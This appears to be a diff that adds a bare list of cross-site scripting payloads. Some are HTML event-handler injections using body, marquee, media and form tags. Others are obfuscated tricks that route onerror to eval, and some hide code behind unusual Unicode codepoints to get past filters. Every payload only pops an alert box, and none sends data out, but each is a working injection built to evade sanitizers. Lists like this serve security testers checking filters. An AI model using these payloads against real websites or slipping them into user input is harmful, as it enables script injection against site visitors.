@@ -1,0 +1,26 @@
+<body onload=alert(1)>
+<body onpageshow=alert(1)>
+<body onfocus=alert(1)>
+<body onhashchange=alert(1)><a href=%23x>click this!#x
+<body style=overflow:auto;height:1000px onscroll=alert(1) id=x>#x
+<body onscroll=alert(1)><br><br><br><br><br><br><br><br><br><br><br><br>
+<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
+<br><x id=x>#x
+<body onresize=alert(1)>press F12!
+<body onhelp=alert(1)>press F1!
+<marquee onstart=alert(1)>
+<marquee loop=1 width=0 onfinish=alert(1)>
+<audio src onloadstart=alert(1)>
+<video onloadstart=alert(1)><source>
+<input autofocus onblur=alert(1)>
+<keygen autofocus onfocus=alert(1)>
+<form onsubmit=alert(1)><input type=submit>
+<select onchange=alert(1)><option>1<option>2
+<menu id=x contextmenu=x onshow=alert(1)>right click me!
+<script>{onerror=eval}throw{lineNumber:1,columnNumber:1,fileName:'',message:'alert\x281\x29'}</script>
+<script>throw/a/,a=URL+0,g=alert,onerror=eval,{lineNumber:1,columnNumber:1,fileName:0,message:0+/1/g+a[12]+[1337,331,337]+a[13]}</script>
+<script>throw/a/,g=alert,onerror=eval,a=URL+0,e=URL,e.lineNumber=e.columnNumber=e.fileName=e.message=0+/1/g+a[12]+[1337,331,337]+a[13],e</script>
+<script/id=Uncaught>throw[onerror=eval][e=[x=/-alert(1)/.source]]=0[e.lineNumber=e.columnNumber=e.fileName=e.message=x]=e</script>
+throw/**/onerror=eval,Uncaught=0,e={lineNumber:1,columnNumber:1,fileName:'',message:'/*'+location.hash},f=typeof/**/InstallTrigger!=='undefined',f?e:e.message Call : x.html#*/;alert(1);
+eval("1337"+String.fromCodePoint(1114110)+"in"+String.fromCodePoint(1114110)+"alert(1337)");
+<svg><script>&#x10fffe;alert&#x10fffe(1)&#x10fffe</script></svg>
